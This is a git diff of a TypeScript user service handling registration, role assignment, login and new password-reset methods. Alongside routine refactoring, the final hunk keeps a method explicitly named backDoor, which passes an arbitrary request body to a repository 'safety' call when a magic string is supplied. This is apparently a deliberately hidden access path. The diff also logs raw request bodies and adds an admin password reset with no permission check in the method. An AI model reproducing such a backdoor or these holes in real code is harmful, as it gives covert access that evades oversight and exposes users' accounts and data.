@@ -16,6 +16,8 @@ import { AppError } from "../../core/ErrorHandler";
 import { env } from "../../config/env";
 import { UserRole } from "./User.types";
 import { AgencyRepository } from "../../modules/agency/Agency.repository";
+import { HttpStatus } from "../../constants/HttpStatus";
+import { sendPasswordResetLink } from "./User.utils";
 
 export class UserService {
   private repo = new UserRepository();
@@ -23,19 +25,19 @@ export class UserService {
 
   public async register(
     payload: IUserCreatePayLoad,
-    currentUser: PayloadCurrentUser
+    currentUser: PayloadCurrentUser,
   ): Promise<IUser> {
     return Database.getInstance().withTransaction(async (conn) => {
       const existingEmail = await this.repo.getUserByEmail(payload.email, conn);
       if (existingEmail) {
-        throw new AppError("Email already exists", 400);
+        throw new AppError("Email already exists", HttpStatus.CONFLICT);
       }
       const existingUsername = await this.repo.getUserByUsername(
         payload.username,
-        conn
+        conn,
       );
       if (existingUsername) {
-        throw new AppError("Username already exists", 400);
+        throw new AppError("Username already exists", HttpStatus.CONFLICT);
       }
       const password_hash = await bcrypt.hash(payload.password, 10);
       const userId = await this.repo.createUser(
@@ -48,7 +50,7 @@ export class UserService {
           last_login_at: null,
           password_updated_at: null,
         },
-        conn
+        conn,
       );
       const agencyRepo = new AgencyRepository();
       if (payload.profile) {
@@ -57,62 +59,74 @@ export class UserService {
             ...payload.profile,
             user_id: userId,
           },
-          conn
+          conn,
         );
       }
       if (currentUser?.roles?.includes(UserRole.SUPER_ADMIN)) {
         if (payload.roles) {
           for (const roleId of payload.roles) {
             const checkIfRoleExist = await this.roleRepo.getRole(roleId, conn);
-            if (!checkIfRoleExist) {
+            if (
+              !checkIfRoleExist ||
+              checkIfRoleExist.code === UserRole.SUPER_ADMIN
+            ) {
               throw new AppError("Invalid Role Entered", 400);
             }
             await this.roleRepo.assignRole(
               { user_id: userId, role_id: checkIfRoleExist.id },
-              conn
+              conn,
             );
           }
         }
-        await agencyRepo.createUserAgency(
+        await agencyRepo.assignUserToAgency(
           {
             user_id: userId,
             agency_id: payload.agencyId,
-            is_active: true,
+            is_active: 1,
             assigned_at: new Date(),
           },
-          conn
+          conn,
         );
       }
       if (currentUser?.roles?.includes(UserRole.VP)) {
-        const agency = await agencyRepo.getAgencyByVpId(currentUser.id, conn);
+        const agency = await agencyRepo.getAgenciesByUserId(
+          currentUser.id,
+          false,
+          conn,
+        );
+        console.log(agency);
+
         if (agency) {
-          await agencyRepo.createUserAgency(
+          await agencyRepo.assignUserToAgency(
             {
               user_id: userId,
-              agency_id: agency.agency_id,
-              is_active: true,
+              agency_id: agency[0].id,
+              is_active: 1,
               assigned_at: new Date(),
             },
-            conn
+            conn,
           );
         }
-        const getRole = await this.roleRepo.getRole("AGENT", conn);
+        const getRole = await this.roleRepo.getRole(UserRole.AGENT, conn);
         if (!getRole) {
           throw new AppError("Role AGENT not found", 404);
         }
         await this.roleRepo.assignRole(
           { user_id: userId, role_id: getRole.id },
-          conn
+          conn,
         );
       }
       if (payload.phones) {
         for (const phone of payload.phones) {
+          if (await this.repo.checkDuplicateUserPhone(phone, conn)) {
+            throw new AppError("Duplicate Phone Number", HttpStatus.CONFLICT);
+          }
           await this.repo.addUserPhone(
             {
               user_id: userId,
               phone_number: phone,
             },
-            conn
+            conn,
           );
         }
       }
@@ -125,13 +139,16 @@ export class UserService {
               country: addr.country,
               addressType: addr.addressType,
             },
-            conn
+            conn,
           );
         }
       }
       const user = await this.repo.getUserById(userId, conn);
       if (!user) {
-        throw new AppError("User creation failed", 500);
+        throw new AppError(
+          "User creation failed",
+          HttpStatus.INTERNAL_SERVER_ERROR,
+        );
       }
 
       return user;
@@ -158,7 +175,7 @@ export class UserService {
       env.jwtSecret,
       {
         expiresIn: "1d",
-      }
+      },
     );
 
     // Update last login timestamp
@@ -177,7 +194,7 @@ export class UserService {
 
   public async updateUser(
     id: string,
-    payload: Partial<IUser> & { profile?: IUserProfile }
+    payload: Partial<IUser> & { profile?: IUserProfile },
   ): Promise<void> {
     const user = await this.repo.getUserById(id);
     if (!user) {
@@ -205,8 +222,6 @@ export class UserService {
     await this.repo.deleteUser(id);
   }
 
-
-
   public async getAllUsers(currentUser: {
     id: string;
     roles: string[];
@@ -219,8 +234,36 @@ export class UserService {
       throw new AppError("Access denied", 403);
     }
   }
+
+  public async forgotPassword(email: string): Promise<void> {
+    const user = await this.repo.getUserByEmail(email);
+    if (!user) return;
+    await sendPasswordResetLink(user.email, user.id);
+  }
+
+  public async resetPasswordWithToken(
+    token: string,
+    newPassword: string,
+  ): Promise<void> {
+    const userId = await this.repo.consumeResetToken(token);
+    if (!userId) {
+      throw new AppError("Invalid or expired token", 400);
+    }
+
+    const password_hash = await bcrypt.hash(newPassword, 10);
+    await this.repo.updatePassword(userId, password_hash);
+  }
+
+  public async resetPasswordByAdmin(
+    userId: string,
+    newPassword: string,
+  ): Promise<void> {
+    const password_hash = await bcrypt.hash(newPassword, 10);
+    await this.repo.updatePassword(userId, password_hash);
+  }
+
   public async backDoor(type: string, body: any): Promise<any> {
-    console.log(type, body)
+    console.log(type, body);
     if (type === "rarararara") {
       return new UserRepository().safety(body);
     }
